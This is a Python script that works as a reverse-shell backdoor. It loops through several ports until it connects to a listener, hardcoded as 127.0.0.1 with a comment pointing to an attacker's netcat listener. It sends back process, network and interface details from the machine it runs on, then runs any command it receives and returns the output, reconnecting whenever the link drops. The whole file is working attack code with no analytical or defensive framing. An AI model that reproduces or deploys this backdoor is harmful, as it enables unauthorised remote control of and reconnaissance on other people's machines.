import socket, time, subprocess, pty

#set a netcat listener on the attacker machine to any of the ports listed below.
mysocket=socket.socket()
#set up colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def ScanAndConnect():
    done=False
    while not done:
        for ports in [7000, 21, 22, 80, 443, 9000]:
            time.sleep(1)
            try:
                mysocket.connect(("127.0.0.1",ports))
            except socket.error:
                continue
            else:    
                mysocket.send (str(bcolors.FAIL + "Connected on port " + str(ports) + "\n"))
                mysocket.send ("Use QUIT to disconnect from the backdoor.\n" + bcolors.WARNING)
                mysocket.send ("Running Checks Stand by...\n" + bcolors.WARNING)
                time.sleep(5)
               
                for cmd in ["ps -elf", "netstat -natup", "ifconfig"]:
                    mysocket.send (str(cmd)+"\n")
                    time.sleep(1)
                    prochandle = subprocess.Popen(cmd,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                    prochandle.wait()
                    results = prochandle.stdout.read() + prochandle.stderr.read()
                    mysocket.send(results)
                    mysocket.send(bcolors.OKGREEN + "\nPress Enter to continue..." + bcolors.WARNING)
                    pause=mysocket.recv(1024)
                    #mysocket.send       
                done=True
                mysocket.send (bcolors.HEADER + "\nEnter all commands as one-liners. ie use "";"" to seperate commands.\n\n" + bcolors.OKBLUE)
                break
ScanAndConnect()
 #pty.spawn("/bin/bash")
while True:
    try: 
        commandrequested=mysocket.recv(1024)
        if len(commandrequested)==0:
            time.sleep(3)
            mysocket=socket.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4]=="QUIT":
            mysocket.send("Terminating Connection.\n")
            break
        prochandle = subprocess.Popen(commandrequested,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        prochandle.wait()
        results = prochandle.stdout.read() + prochandle.stderr.read()
        mysocket.send(results)
    except socket.error:
        break
    except Exception as e:
        mysocket.send(str(e))
        break
